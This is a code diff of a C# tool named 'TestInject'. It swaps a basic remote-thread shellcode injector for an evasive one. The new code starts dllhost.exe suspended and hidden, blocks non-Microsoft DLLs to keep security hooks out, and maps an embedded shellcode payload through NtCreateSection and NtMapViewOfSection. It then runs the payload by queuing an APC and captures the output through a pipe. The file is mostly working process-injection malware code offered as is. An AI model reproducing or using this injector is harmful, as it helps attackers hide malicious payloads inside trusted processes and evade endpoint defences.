@@ -14,165 +14,237 @@ namespace TestInject
     internal class Program
     {
 
-        [DllImport("kernel32.dll")]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool CreateProcess(
-           string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
-           ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
-           IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
-           out PROCESS_INFORMATION lpProcessInformation);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool CloseHandle(IntPtr hObject);
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        struct STARTUPINFOEX
-        {
-            public STARTUPINFO StartupInfo;
-            public IntPtr lpAttributeList;
-        }
-
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        struct STARTUPINFO
-        {
-            public Int32 cb;
-            public string lpReserved;
-            public string lpDesktop;
-            public string lpTitle;
-            public Int32 dwX;
-            public Int32 dwY;
-            public Int32 dwXSize;
-            public Int32 dwYSize;
-            public Int32 dwXCountChars;
-            public Int32 dwYCountChars;
-            public Int32 dwFillAttribute;
-            public UInt32 dwFlags;
-            public Int16 wShowWindow;
-            public Int16 cbReserved2;
-            public IntPtr lpReserved2;
-            public IntPtr hStdInput;
-            public IntPtr hStdOutput;
-            public IntPtr hStdError;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        internal struct PROCESS_INFORMATION
-        {
-            public IntPtr hProcess;
-            public IntPtr hThread;
-            public int dwProcessId;
-            public int dwThreadId;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct SECURITY_ATTRIBUTES
-        {
-            public int nLength;
-            public IntPtr lpSecurityDescriptor;
-            public int bInheritHandle;
-        }
-
-        [DllImport("kernel32.dll")]
-        static extern int GetProcessId(IntPtr handle);
-        public static int? CreateProcess(string appPath)
-        {
-            var pInfo = new PROCESS_INFORMATION();
-            var sInfoEx = new STARTUPINFOEX();
-            sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
-            IntPtr lpValue = IntPtr.Zero;
-
-            try
-            {
-
-                var pSec = new SECURITY_ATTRIBUTES();
-                var tSec = new SECURITY_ATTRIBUTES();
-                pSec.nLength = Marshal.SizeOf(pSec);
-                tSec.nLength = Marshal.SizeOf(tSec);
-
-                if (CreateProcess(appPath, null, ref pSec, ref tSec, false, (uint)(CreationFlags.ExtendedStartupInfoPresent | CreationFlags.CreateSuspended | CreationFlags.CreateNoWindow), IntPtr.Zero, null, ref sInfoEx, out pInfo))
-                {
-                    return GetProcessId(pInfo.hProcess);
-                }
-            }
-            finally
-            {
-                Marshal.FreeHGlobal(lpValue);
-
-                // Close process and thread handles
-                if (pInfo.hProcess != IntPtr.Zero)
-                {
-                    CloseHandle(pInfo.hProcess);
-                }
-                if (pInfo.hThread != IntPtr.Zero)
-                {
-                    CloseHandle(pInfo.hThread);
-                }
-            }
-            return null;
-        }
-
         static void Main(string[] args)
         {
-            try
+            //string cmd = "cmd /c echo tata && ping 127.0.0.1";
+            string cmd = @"c:\windows\system32\dllhost.exe";
+            byte[] shellcode = Properties.Resources.Payload;
+
+            //===================================================================================================================
+
+            //var sInfoEx = new STARTUPINFOEX();
+            //sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
+
+            //IntPtr lpValue = IntPtr.Zero;
+
+
+            //SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
+            //saAttr.nLength = Marshal.SizeOf(saAttr);
+            //saAttr.bInheritHandle = 1;
+            //saAttr.lpSecurityDescriptor = IntPtr.Zero;
+
+            ////Create output pipe
+            //CreatePipe(out var outPipe_rd, out var outPipe_w, ref saAttr, 0);
+
+            //// Ensure the read handle to the pipe for STDOUT is not inherited.
+            //SetHandleInformation(outPipe_rd, HANDLE_FLAGS.INHERIT, 0);
+
+            //sInfoEx.StartupInfo.hStdError = outPipe_w;
+            //sInfoEx.StartupInfo.hStdOutput = outPipe_w;
+            ////sInfoEx.StartupInfo.hStdInput = inPipe_rd;
+
+            //sInfoEx.StartupInfo.dwFlags |= (uint)CreationFlags.UseStdHandles;
+
+            //var pSec = new SECURITY_ATTRIBUTES();
+            //var tSec = new SECURITY_ATTRIBUTES();
+            //pSec.nLength = Marshal.SizeOf(pSec);
+            //tSec.nLength = Marshal.SizeOf(tSec);
+
+            //CreateProcess(null, cmd, ref pSec, ref tSec, true, (uint)(CreationFlags.ExtendedStartupInfoPresent), IntPtr.Zero, null, ref sInfoEx, out var pInfo);
+
+
+
+            //***************************************************************************************************************************************************************************
+
+
+            var startupInfoEx = new DInvoke.DynamicInvoke.STARTUPINFOEX();
+
+            _ = DInvoke.DynamicInvoke.Process.InitializeProcThreadAttributeList(ref startupInfoEx.lpAttributeList, 2);
+
+            const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
+            const int MITIGATION_POLICY = 0x20007;
+
+            var blockDllPtr = Marshal.AllocHGlobal(IntPtr.Size);
+            Marshal.WriteIntPtr(blockDllPtr, new IntPtr(BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
+
+            _ = DInvoke.DynamicInvoke.Process.UpdateProcThreadAttribute(
+                ref startupInfoEx.lpAttributeList,
+                (IntPtr)MITIGATION_POLICY,
+                ref blockDllPtr);
+
+            const uint USE_STD_HANDLES = 0x00000100;
+
+            DInvoke.DynamicInvoke.SECURITY_ATTRIBUTES saAttr = new DInvoke.DynamicInvoke.SECURITY_ATTRIBUTES();
+            saAttr.bInheritHandle = true;
+            saAttr.lpSecurityDescriptor = IntPtr.Zero;
+            //
+
+            //SECURITY_ATTRIBUTES saAttr2 = new SECURITY_ATTRIBUTES();
+            //saAttr2.nLength = Marshal.SizeOf(saAttr2);
+            //saAttr2.bInheritHandle = true;
+            //saAttr2.lpSecurityDescriptor = IntPtr.Zero;
+            //CreatePipe(out var outPipe_rd, out var outPipe_w, ref saAttr, 0);
+            DInvoke.DynamicInvoke.Process.CreatePipe(out var outPipe_rd, out var outPipe_w, ref saAttr);
+
+            // Ensure the read handle to the pipe for STDOUT is not inherited.
+            DInvoke.DynamicInvoke.Process.SetHandleInformation(outPipe_rd, DInvoke.DynamicInvoke.HANDLE_FLAGS.INHERIT, 0);
+            
+
+            startupInfoEx.StartupInfo.hStdError = outPipe_w;
+            startupInfoEx.StartupInfo.hStdOutput = outPipe_w;
+            //sInfoEx.StartupInfo.hStdInput = inPipe_rd;
+
+
+            startupInfoEx.StartupInfo.dwFlags |= USE_STD_HANDLES;
+
+
+            const uint CREATE_SUSPENDED = 0x00000004;
+            const uint CREATE_NO_WINDOW = 0x08000000;
+            const uint EXTENDED_STARTUP_INFO_PRESENT = 0x00080000;
+
+            DInvoke.DynamicInvoke.Process.CreateProcess(
+                cmd,
+                null,
+                //CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUP_INFO_PRESENT,
+                EXTENDED_STARTUP_INFO_PRESENT | CREATE_NO_WINDOW | CREATE_SUSPENDED,
+                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
+                ref startupInfoEx,
+                out var pInfo, true);
+
+
+            //=================================================================================================================================================================
+
+            DInvoke.DynamicInvoke.Process.CloseHandle(outPipe_w);
+
+            var procId = pInfo.dwProcessId;
+            if (procId == 0)
             {
-                var procRes = CreateProcess(Properties.Resources.Host);
-                if (!procRes.HasValue)
-                    throw new InvalidOperationException($"Failed to create process, error code: {Marshal.GetLastWin32Error()}");
-
-
-                Process process = Process.GetProcessById(procRes.Value);
-                IntPtr pHandle = process.Handle;
-
-                var shellcode = Properties.Resources.Payload;
-
-
-                var baseAddress = Native.Kernel32.VirtualAllocEx(
-                    pHandle,
-                    IntPtr.Zero,
-                    shellcode.Length,
-                    Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
-                    Native.Kernel32.MemoryProtection.ReadWrite);
-
-                if (baseAddress == IntPtr.Zero)
-                    throw new InvalidOperationException($"Failed to allocate memory, error code: {Marshal.GetLastWin32Error()}");
-
-
-                IntPtr bytesWritten = IntPtr.Zero;
-                if (!Native.Kernel32.WriteProcessMemory(pHandle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
-                    throw new InvalidOperationException($"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}");
-
-                if (bytesWritten.ToInt32() != shellcode.Length)
-                    throw new InvalidOperationException($"Failed to write All the shellcode into the process");
-
-                if (!Native.Kernel32.VirtualProtectEx(
-                    pHandle,
-                    baseAddress,
-                    shellcode.Length,
-                    Native.Kernel32.MemoryProtection.ExecuteRead,
-                    out _))
-                    throw new InvalidOperationException($"Failed to cahnge memory to execute, error code: {Marshal.GetLastWin32Error()}");
-
-                IntPtr threadres = IntPtr.Zero;
-
-                IntPtr thread = Native.Kernel32.CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadres);
-
-                if (thread == IntPtr.Zero)
-                    throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
-
-                //Native.Kernel32.WaitForSingleObject(thread, 0xFFFFFFFF);
+                throw new InvalidOperationException("Process was not started!");
             }
-            catch (InvalidOperationException e)
+
+            const uint GENERIC_ALL = 0x10000000;
+            const uint PAGE_EXECUTE_READWRITE = 0x40;
+            const uint SEC_COMMIT = 0x08000000;
+
+            var hLocalSection = IntPtr.Zero;
+            var maxSize = (ulong)shellcode.Length;
+
+            var status = DInvoke.DynamicInvoke.Native.NtCreateSection(
+                ref hLocalSection,
+                GENERIC_ALL,
+                IntPtr.Zero,
+                ref maxSize,
+                PAGE_EXECUTE_READWRITE,
+                SEC_COMMIT,
+                IntPtr.Zero);
+
+            const uint PAGE_READWRITE = 0x04;
+
+            var self = System.Diagnostics.Process.GetCurrentProcess();
+            var hLocalBaseAddress = IntPtr.Zero;
+
+            status = DInvoke.DynamicInvoke.Native.NtMapViewOfSection(
+                hLocalSection,
+                self.Handle,
+                ref hLocalBaseAddress,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                ref maxSize,
+                2,
+                0,
+                PAGE_READWRITE);
+
+            const uint PAGE_EXECUTE_READ = 0x20;
+
+            var hRemoteBaseAddress = IntPtr.Zero;
+
+            status = DInvoke.DynamicInvoke.Native.NtMapViewOfSection(
+                hLocalSection,
+                pInfo.hProcess,
+                ref hRemoteBaseAddress,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                ref maxSize,
+                2,
+                0,
+                PAGE_EXECUTE_READ);
+
+            Marshal.Copy(shellcode, 0, hLocalBaseAddress, shellcode.Length);
+
+            var res = DInvoke.DynamicInvoke.Process.NtQueueApcThread(
+            pInfo.hThread,
+            hRemoteBaseAddress,
+            IntPtr.Zero,
+            IntPtr.Zero,
+            IntPtr.Zero);
+
+            _ = DInvoke.DynamicInvoke.Process.NtResumeThread(pInfo.hThread);
+            //==========================================================================================================
+
+
+
+
+            Process process = Process.GetProcessById(pInfo.dwProcessId);
+
+            byte[] b = null;
+            while (!process.HasExited)
             {
-                Debug.WriteLine(e.Message);
+                b = ReadFromPipe(outPipe_rd);
+                if (b != null)
+                {
+                    Console.WriteLine("Received : " + Encoding.UTF8.GetString(b));
+                }
+                Thread.Sleep(100);
             }
-            finally
+            b = ReadFromPipe(outPipe_rd);
+            if (b != null)
             {
-                //Native.Kernel32.VirtualFreeEx(process.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
+                Console.WriteLine(Encoding.UTF8.GetString(b));
             }
 
-            Thread.Sleep(5000);
+            DInvoke.DynamicInvoke.Process.CloseHandle(outPipe_rd);
 
-
+            Console.WriteLine("key plz");
+            Console.ReadKey();
+            return;
         }
 
+        //static byte[] ReadFromPipe(IntPtr pipe)
+        //// Read output from the child process's pipe for STDOUT
+        //// and write to the parent process's pipe for STDOUT. 
+        //// Stop when there is no more data. 
+        //{
+        //    byte[] chBuf = new byte[1024];
+        //    bool bSuccess = false;
+
+        //    //while (!bSuccess)
+        //    //{
+        //    bSuccess = ReadFile(pipe, chBuf, 1024, out var nbBytesRead, IntPtr.Zero);
+        //    if (!bSuccess)
+        //    {
+        //        Console.WriteLine($"Failed reading pipe, error code: {Marshal.GetLastWin32Error()}");
+        //        return null;
+        //    }
+
+        //    return chBuf;
+        //    //    if (!bSuccess || nbBytesRead == 0) break;
+
+        //    //    if (!bSuccess) break;
+        //    //}
+        //}
+
+        static byte[] ReadFromPipe(IntPtr pipe)
+        {
+           
+            if (!DInvoke.DynamicInvoke.Process.ReadFile(pipe,  out var buff, 1024))
+            {
+                Console.WriteLine($"Failed reading pipe, error code: {Marshal.GetLastWin32Error()}");
+                return null;
+            }
+
+            return buff;
+        }
     }
 }
